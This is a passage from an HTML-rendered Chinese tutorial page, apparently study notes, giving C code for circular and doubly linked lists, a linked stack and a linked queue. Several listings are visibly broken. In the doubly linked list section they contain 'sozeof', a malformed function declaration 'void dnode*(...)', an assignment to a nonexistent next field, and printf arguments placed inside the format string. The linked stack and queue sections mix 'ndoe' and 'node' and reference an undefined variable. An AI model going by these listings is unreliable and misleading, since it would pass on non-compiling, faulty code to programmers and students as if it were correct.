<span class="keyword">return</span> head;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            p-&gt;next = q-&gt;next;</span><br><span class="line">            q-&gt;next = p;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//删除操作  删除值是 x 的结点</span></span><br><span class="line"><span class="function">node *<span class="title">delete</span><span class="params">(node *head,datatype x)</span></span>&#123;</span><br><span class="line">    node *pre = <span class="literal">NULL</span>,*q;</span><br><span class="line">    <span class="keyword">if</span>(!head)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;循环单链表是空的！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    q = head;</span><br><span class="line">    <span class="keyword">while</span>(q-&gt;next != head &amp;&amp; q-&gt;info != x)&#123;</span><br><span class="line">        pre = q;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;info != x)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;没有找到指定位置！\n&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(q != head)&#123;</span><br><span class="line">            pre-&gt;next = q-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(head-&gt;next == head) &#123;<span class="built_in">free</span>(q); head = <span class="literal">NULL</span>;&#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                pre = head-&gt;next;</span><br><span class="line">                <span class="keyword">while</span>(pre-&gt;next != q) pre = pre-&gt;next;</span><br><span class="line">                head = head-&gt;next;</span><br><span class="line">                pre-&gt;next = head;</span><br><span class="line">                <span class="built_in">free</span>(q);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="题目：将一个-双链表-改成一个-循环-双链表"><a href="#题目：将一个-双链表-改成一个-循环-双链表" class="headerlink" title="题目：将一个  双链表  改成一个  循环 双链表"></a>题目：将一个  双链表  改成一个  循环 双链表</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span> *<span class="title">llink</span>,*<span class="title">rlink</span>;</span></span><br><span class="line">&#125;dnode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//尾插法 创建带头结点的双链表</span></span><br><span class="line"><span class="function">dnode *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    dnode *head,*r,*s; <span class="comment">//注意：同时定义多个指针</span></span><br><span class="line">    datatype x;</span><br><span class="line">    head = r = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));<span class="comment">//建立双链表的头结点</span></span><br><span class="line">    head-&gt;llink = head-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输出双链表的内容：(以 0 结束)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = r-&gt;rlink; <span class="comment">//将新的结点 s 插入到双链表的末尾</span></span><br><span class="line">        s-&gt;llink = r;</span><br><span class="line">        r-&gt;rlink = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    dnode *p;</span><br><span class="line">p = head-&gt;rlink;  <span class="comment">//由于是带头结点的 所以 指向 head 的 下一个位置</span></span><br><span class="line">    <span class="keyword">while</span>(p != head)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">        p = p-&gt;rlink;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将一个  双链表  改成一个  循环 双链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(dnode *head)</span></span>&#123;</span><br><span class="line">    dnode *r;</span><br><span class="line">    r = head;</span><br><span class="line">    <span class="keyword">while</span>(r-&gt;rlink)</span><br><span class="line">        r = r-&gt;rlink;</span><br><span class="line">    head-&gt;llink = r;</span><br><span class="line">    r-&gt;rlink = head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    dnode *pt;</span><br><span class="line">    pt = creat_behind();</span><br><span class="line">    change(pt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;循环双链表的内容是：\n&quot;</span>);</span><br><span class="line">    print(pt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/05/w2KEWsoXftTZBa8.png" alt="image-20211005194850587"></p><h3 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h3><p>为了便于知道 链表中任意一个结点的 前驱结点 和 后继结点，我们再设一个指针域来指向该节点的前驱结点，从而形成了双链表。</p><p>双链表中，其结点  含有 三个域：info   llink   rlink</p><p><img src="https://i.loli.net/2021/10/03/nm8fFAcD5gqrICk.png" alt="image-20211003095857245"></p><h4 id="双链表的创建"><a href="#双链表的创建" class="headerlink" title="双链表的创建"></a>双链表的创建</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//尾插法 创建带头结点的双链表</span></span><br><span class="line"><span class="function">dnode *<span class="title">creat_behind</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    dnode *head,*r,*s; <span class="comment">//注意：同时定义多个指针</span></span><br><span class="line">    datatype x;</span><br><span class="line">    head = r = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));<span class="comment">//建立双链表的头结点</span></span><br><span class="line">    head-&gt;llink = head-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输出双链表的内容：(以 0 结束)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    <span class="keyword">while</span>(x)&#123;</span><br><span class="line">        s = (dnode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(dnode));</span><br><span class="line">        s-&gt;info = x;</span><br><span class="line">        s-&gt;rlink = r-&gt;rlink; <span class="comment">//将新的结点 s 插入到双链表的末尾</span></span><br><span class="line">        s-&gt;llink = r;</span><br><span class="line">        r-&gt;rlink = s;</span><br><span class="line">        r = s;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="双链表的操作"><a href="#双链表的操作" class="headerlink" title="双链表的操作"></a>双链表的操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dlink_node</span> *<span class="title">llink</span>,*<span class="title">rlink</span>;</span></span><br><span class="line">&#125;dnode;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function">dnode *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="keyword">void</span> dnode*(dnode *head)&#123;</span><br><span class="line">    dnode *p = head;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;双链表是空的！\n&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表中各个结点的值是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">        p = p-&gt;rlink;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找 第 i 个结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">find_i</span><span class="params">(dnode *head,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    dnode *p = head;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; <span class="number">1</span>) &#123;<span class="built_in">printf</span>(<span class="string">&quot;第%d个结点位置不存在！\n,i&quot;</span>);<span class="keyword">return</span> <span class="literal">NULL</span>;&#125;</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; i != j)&#123;</span><br><span class="line">        p = p-&gt;rlink;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p) &#123;<span class="built_in">printf</span>(<span class="string">&quot;第%d个结点位置不存在！\n,i&quot;</span>);<span class="keyword">return</span> <span class="literal">NULL</span>;&#125;  <span class="comment">//为什么？？</span></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在 第 i 个结点后 插入 值为 x 的结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">insert</span><span class="params">(dnode *head,datatype x,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    dnode *p,*q;</span><br><span class="line">    p = (dnode*)<span class="built_in">malloc</span>(sozeof(dnode));<span class="comment">//为新的结点分配空间</span></span><br><span class="line">    p-&gt;next = x; <span class="comment">//设置新的结点值</span></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">0</span>)&#123;  <span class="comment">//插入到第一个结点</span></span><br><span class="line">        p-&gt;llink = <span class="literal">NULL</span>;</span><br><span class="line">        p-&gt;rlink = head;</span><br><span class="line">        <span class="keyword">if</span>(!head)&#123;</span><br><span class="line">            head = p;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            head-&gt;llink = p;</span><br><span class="line">            head = p;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">q = find_i(head,i);</span><br><span class="line">    <span class="keyword">if</span>(!q) &#123;<span class="built_in">printf</span>(<span class="string">&quot;第 %d 个结点不存在，无法插入！\n&quot;</span>); <span class="keyword">return</span> head;&#125;</span><br><span class="line">    <span class="keyword">if</span>(q-&gt;rlink == <span class="literal">NULL</span>)&#123;  <span class="comment">//插到最后一个结点</span></span><br><span class="line">        p-&gt;rlink = q-&gt;rlink;</span><br><span class="line">        p-&gt;llink = q;</span><br><span class="line">        q-&gt;rlink = p;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  <span class="comment">//中间插入</span></span><br><span class="line">        p-&gt;rlink = q-&gt;rlink;</span><br><span class="line">        p-&gt;llink = q;</span><br><span class="line">        q-&gt;rlink-&gt;llink = p;</span><br><span class="line">        q-&gt;rlink = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//删除 值为 x 的结点</span></span><br><span class="line"><span class="function">dnode *<span class="title">delete</span><span class="params">(dnode *head,datatype x)</span></span>&#123;</span><br><span class="line">    dnode *q;</span><br><span class="line">    <span class="keyword">if</span>(!head)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;双链表为空，无法删除！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    q = head;</span><br><span class="line">    <span class="keyword">while</span>(q &amp;&amp; q-&gt;info != x)  <span class="comment">//寻找 值为 x 的结点的位置</span></span><br><span class="line">        q = q-&gt;rlink;</span><br><span class="line">    <span class="keyword">if</span>(!q)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;找不到结点的位置！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q == head &amp;&amp; head-&gt;rlink)&#123;  <span class="comment">//需要删除的是第一个结点，而且表中 不只有这一个结点</span></span><br><span class="line">        head = head-&gt;rlink;</span><br><span class="line">        head-&gt;llink = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">free</span>(q);</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(q == head &amp;&amp; !head-&gt;rlink)&#123; <span class="comment">//需要删除的是第一个结点，而且表中 仅仅只有这一个结点</span></span><br><span class="line">        <span class="built_in">free</span>(q);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;  <span class="comment">//直接将双链表 置空，即初始化即可</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!q-&gt;rlink)&#123;<span class="comment">//被删除的是 链表 最后一个结点</span></span><br><span class="line">            q-&gt;llink-&gt;rlink = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//需要删除的是中间的结点</span></span><br><span class="line">            q-&gt;llink-&gt;rlink = q-&gt;rlink;</span><br><span class="line">            q-&gt;rlink-&gt;llink = q-&gt;llink;</span><br><span class="line">            <span class="built_in">free</span>(q);</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="链式栈"><a href="#链式栈" class="headerlink" title="链式栈"></a>链式栈</h3><p>栈的链式存储，特殊的单链表</p><p>插入 与 删除  在 单链表的 同一端进行</p><p>栈顶指针  top指向第一个结点的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_stack</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_stack</span> *<span class="title">top</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125;ndoe;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化：建立一个空的 栈</span></span><br><span class="line"><span class="function">node *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断 是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (top?<span class="number">0</span>:<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//取得链式栈 栈顶的结点值</span></span><br><span class="line"><span class="function">datatype <span class="title">read_top</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!top)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;链式栈是空的！\n&quot;</span>); <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line">    <span class="keyword">return</span> (top-&gt;info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = top;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;链式栈是空的！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//进栈：插入值为 x 的结点 为 top</span></span><br><span class="line"><span class="function">node *<span class="title">push</span><span class="params">(node *top,datatype x)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    p = (node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(ndoe));</span><br><span class="line">    p-&gt;info = x;</span><br><span class="line">    p-&gt;next = top;</span><br><span class="line">    top = p;</span><br><span class="line">    <span class="keyword">return</span> top;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//出栈：删除链式栈栈顶结点 top</span></span><br><span class="line"><span class="function">node *<span class="title">delete</span><span class="params">(node *top)</span></span>&#123;</span><br><span class="line">    node *q;</span><br><span class="line">    <span class="keyword">if</span>(!top)</span><br><span class="line">    &#123;<span class="built_in">printf</span>(<span class="string">&quot;链式栈是空的！\n&quot;</span>);<span class="keyword">return</span> <span class="literal">NULL</span>;&#125;</span><br><span class="line">    q = top;</span><br><span class="line">    top = top-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(q);</span><br><span class="line">    <span class="keyword">return</span> top;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="链式队列"><a href="#链式队列" class="headerlink" title="链式队列"></a>链式队列</h3><p>队列的链式存储，特殊的单链表</p><p>插入 与 删除 分别在单链表的两端进行</p><p>队首 front       队尾  rear  指向最后一个结点，即最后一个结点的 next 是 NULL</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> datatype;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span>&#123;</span></span><br><span class="line">    datatype info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_node</span> *<span class="title">next</span>;</span>   <span class="comment">//结点定义</span></span><br><span class="line">&#125;node;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    node *front,*rear;      <span class="comment">//队首 队尾指针 定义</span></span><br><span class="line">&#125;<span class="built_in">queue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化：建立一个 空的链式队列</span></span><br><span class="line"><span class="function"><span class="built_in">queue</span> *<span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">queue</span> *qu;</span><br><span class="line">    qu = (<span class="built_in">queue</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">queue</span>));</span><br><span class="line">    qu-&gt;front = <span class="literal">NULL</span>;</span><br><span class="line">    qu-&gt;rear = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> qu;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断 链式队列 是否为空</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">empty</span><span class="params">(<span class="built_in">queue</span> qu)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (qu.front ? <span class="number">0</span>:<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="built_in">queue</span> *qu)</span></span>&#123;</span><br><span class="line">    node *p;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    p = qu-&gt;front;</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;链式队列的空的！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(p)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,p-&gt;info);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//取得链式队列队首结点值</span></span><br><span class="line"><span class="function">datatype <span class="title">read_front</span><span class="params">(<span class="built_in">queue</span> qu)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!p.front)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;链式队列是空的！\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (qu.front-&gt;info);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 